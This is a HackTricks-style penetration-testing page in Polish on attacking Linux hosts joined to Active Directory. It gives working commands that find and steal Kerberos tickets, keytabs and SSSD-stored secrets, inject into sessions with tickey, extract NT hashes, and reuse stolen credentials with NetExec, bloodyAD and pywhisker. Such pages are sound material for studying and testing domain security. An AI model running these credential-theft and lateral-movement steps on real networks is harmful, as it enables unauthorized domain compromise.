# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Maszyna Linux może również znajdować się w środowisku Active Directory.

Maszyna Linux w środowisku AD może **lokalnie przechowywać materiały Kerberos**: user ccaches, machine/service keytabs oraz sekrety zarządzane przez SSSD. Te artefakty można zazwyczaj ponownie wykorzystać tak jak każde inne poświadczenie Kerberos. Aby odczytać większość z nich, musisz być właścicielem użytkownika danego ticketu lub mieć uprawnienia **root** na maszynie.

## Enumeracja

### Enumeracja AD z Linuxa

Jeśli masz dostęp do AD z Linuxa (lub do bash w Windows), możesz użyć [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) do przeprowadzenia enumeracji AD.

Możesz również sprawdzić poniższą stronę, aby poznać **inne sposoby przeprowadzania enumeracji AD z Linuxa**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA to open-source’owa **alternatywa** dla Microsoft Windows **Active Directory**, przeznaczona głównie dla środowisk **Unix**. Łączy kompletny **katalog LDAP** z MIT **Kerberos** Key Distribution Center, zapewniając zarządzanie podobne do Active Directory. Wykorzystując Dogtag **Certificate System** do zarządzania certyfikatami CA i RA, obsługuje uwierzytelnianie **multi-factor**, w tym smartcards. SSSD jest zintegrowane z procesami uwierzytelniania Unix. Dowiedz się więcej na ten temat:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefakty hosta dołączonego do domeny

Przed rozpoczęciem pracy z ticketami ustal, **w jaki sposób host został dołączony do AD** oraz **gdzie faktycznie przechowywane są materiały Kerberos**. Na nowoczesnych hostach Linux obsługują to zazwyczaj `realmd` + `adcli` + `sssd`, a nie tylko zwykłe pliki w `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
To szybko informuje, czy host ufa AD, czy SSSD buforuje identities lub tickets oraz czy dostępne są **machine/service keytabs** lub **KCM secrets**, które można wykorzystać.

## Praca z tickets

### Pass The Ticket

Na tej stronie znajdziesz różne miejsca, w których można **znaleźć bilety Kerberos wewnątrz hosta Linux**. Na poniższej stronie dowiesz się, jak przekształcić te formaty ticketów CCache do formatu Kirbi (formatu wymaganego w Windows), a także jak przeprowadzić atak PTT:

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Jeśli interesują Cię **specyficzne dla Linux workflows pozyskiwania ticketów** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` itd.), sprawdź dedykowaną stronę:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Ponowne użycie ticketów CCACHE z /tmp

Pliki CCACHE to formaty binarne służące do **przechowywania credentials Kerberos**. `FILE:/tmp/krb5cc_%{uid}` jest nadal często spotykany, ale nowoczesne wdrożenia Linux używają również `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` lub `KCM:%{uid}`. Sprawdź zmienną środowiskową **`KRB5CCNAME`** oraz ustawienie `default_ccache_name`, zanim założysz, że tickety znajdują się w `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Ponowne użycie biletu CCACHE z keyring

**Bilety Kerberos przechowywane w pamięci procesu można wyodrębnić**, szczególnie gdy ochrona ptrace na maszynie jest wyłączona (`/proc/sys/kernel/yama/ptrace_scope`). Przydatne narzędzie do tego celu znajduje się pod adresem [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey). Ułatwia ono ekstrakcję poprzez wstrzykiwanie kodu do sesji i zrzucanie biletów do katalogu `/tmp`.

Aby skonfigurować i użyć tego narzędzia, wykonuje się poniższe kroki:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Ta procedura spróbuje wykonać injection do różnych sesji, wskazując powodzenie przez zapisanie wyodrębnionych ticketów w `/tmp`, zgodnie z konwencją nazewnictwa `__krb_UID.ccache`.

### Ponowne użycie ticketów CCACHE z SSSD KCM

SSSD utrzymuje kopię bazy danych w ścieżce `/var/lib/sss/secrets/secrets.ldb`. Odpowiedni klucz jest przechowywany jako ukryty plik w ścieżce `/var/lib/sss/secrets/.secrets.mkey`. Domyślnie klucz jest możliwy do odczytania tylko po uzyskaniu uprawnień **root**.

Wywołanie **`SSSDKCMExtractor`** z parametrami --database i --key przeanalizuje bazę danych i **odszyfruje sekrety**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**Blob credential cache Kerberos można przekonwertować na użyteczny plik Kerberos CCache**, który można przekazać do Mimikatz/Rubeus.

### Szybki triage keytab
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Wyodrębnianie kont z /etc/krb5.keytab

Klucze kont usług, niezbędne dla usług działających z uprawnieniami root, są bezpiecznie przechowywane w plikach **`/etc/krb5.keytab`**. Klucze te, podobnie jak hasła usług, wymagają ścisłej poufności.

Do sprawdzenia zawartości pliku keytab można użyć **`klist`**. W systemie Linux polecenie `klist -k -K -e` wyświetla principal, numery wersji kluczy, typy szyfrowania oraz surowy materiał kluczowy. Jeśli typ klucza to **23 / RC4-HMAC**, jego wartość jest również **hashem NT** danego principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Dla użytkowników Linux **`KeyTabExtract`** oferuje funkcję wyodrębniania hasha RC4 HMAC, który można wykorzystać do ponownego użycia hasha NTLM. Należy pamiętać, że działa to tylko wtedy, gdy keytab nadal zawiera materiał **etype 23 / RC4-HMAC**. W środowiskach **AES-only** może nie być możliwe uzyskanie hasha NT do ponownego użycia, ale nadal można bezpośrednio uwierzytelniać się za pomocą keytab przez Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
W systemie macOS **`bifrost`** służy jako narzędzie do analizy plików keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Wykorzystując wyodrębnione informacje o kontach i hashach, można nawiązywać połączenia z serwerami za pomocą narzędzi takich jak **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Ponowne użycie konta komputera z `/etc/krb5.keytab`

W systemach dołączonych za pomocą `realmd`/`adcli`/`sssd` plik `/etc/krb5.keytab` zwykle zawiera **konto komputera** oraz jeden lub więcej **host/service principals**. Jeśli masz **root**, nie zrzucaj go bezpośrednio: użyj jednego z principalów wyświetlonych przez `klist -k`, aby zażądać TGT i działać jako sam host Linux.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Jest to szczególnie przydatne, gdy sam **computer object** ma delegated rights w AD lub gdy host może pobierać inne secrets, takie jak **gMSA**.

### Ponowne wykorzystanie skradzionych materiałów Kerberos przy użyciu narzędzi AD działających natywnie w Linux

Gdy masz prawidłowy `ccache` lub użyteczny keytab, możesz działać przeciwko AD **bezpośrednio z Linux**, bez wcześniejszego konwertowania wszystkiego do formatów Windows. Wiele nowoczesnych narzędzi natywnie obsługuje `KRB5CCNAME` / uwierzytelnianie Kerberos:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
To dobre połączenie między **Linux post-exploitation** a **AD object abuse**. Informacje o samych ścieżkach nadużywania obiektów znajdziesz tutaj:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefakty Linux gMSA / Managed Service Account

Nowsze wdrożenia Linux mogą bezpośrednio korzystać z **Managed Service Accounts** z AD. W praktyce oznacza to, że po przejęciu Linux server możesz znaleźć nie tylko host keytab, ale także **service-specific keytabs** wygenerowane z gMSA. Typowe miejsca do sprawdzenia to `/etc/gmsad.conf`, pliki konfiguracyjne specyficzne dla wdrożenia oraz dodatkowe pliki `*.keytab` w `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Zapewnia to wielokrotnego użytku tożsamość Kerberos dla SPN powiązanych z tym gMSA **bez dotykania jakiegokolwiek Windows endpoint**. Aby poznać wykorzystanie gMSA/dMSA **po stronie domeny** po uzyskaniu wyższych uprawnień w AD, sprawdź:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## Referencje

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
